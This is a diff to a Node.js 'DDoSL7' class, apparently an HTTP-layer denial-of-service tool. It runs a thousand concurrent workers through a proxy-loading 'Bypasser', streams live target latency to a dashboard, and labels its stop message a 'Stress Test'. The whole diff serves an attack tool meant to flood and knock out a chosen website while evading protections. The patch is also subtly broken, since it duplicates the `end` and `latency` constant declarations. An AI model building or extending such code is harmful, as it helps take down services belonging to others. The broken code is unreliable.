@@ -14,6 +14,7 @@ const { performance } = require('perf_hooks');
 const events = require('events');
 const readline = require('readline');
 const DurationManager = require('../module/duration');
+const AttackManager = require('../module/attackManager');
 const { Bypasser } = require('./Bypass');
 const fs = require('fs');
 
@@ -90,7 +91,7 @@ class DDoSL7 {
         this.startTime = null;
         this.concurrency = 1000;
         this.workers = [];
-        this.bypasser = new Bypasser();
+        this.bypasser = new Bypasser(this.io);
         this.bypasser.loadProxiesFromFile('proxies.txt');
         this.ai = new AIAttackDefenseEngine();
         this.resolvedIP = null;
@@ -236,7 +237,16 @@ class DDoSL7 {
                 const res = await axios.get(this.target, { 
                     timeout: 5000, 
                     validateStatus: false,
-                    headers: { 'Cache-Control': 'no-cache' }
+                    headers: { 'Cache-Control': 'no-cache' },
+                    httpAgent: this.agents.http,
+                    httpsAgent: this.agents.https
+                });
+                const end = performance.now();
+                const latency = end - start;
+                if (this.io) this.io.emit('target_movement', {
+                    status: res.status,
+                    latency: latency.toFixed(2),
+                    timestamp: new Date().toLocaleTimeString()
                 });
                 const end = performance.now();
                 const latency = end - start;
@@ -587,10 +597,9 @@ class DDoSL7 {
     stop() {
         this.isRunning = false;
         this.workers.forEach(w => w.terminate());
+        AttackManager.remove(this.target);
+        this.emitLog(`[END] Stress Test Terminated. Total Packets: ${this.stats.requestsSent}`, 'success');
         if (this.io) this.io.emit('attack_complete', this.stats);
-        setTimeout(() => {
-            if (cluster.isMaster) process.exit(0);
-        }, 500);
     }
 }
 
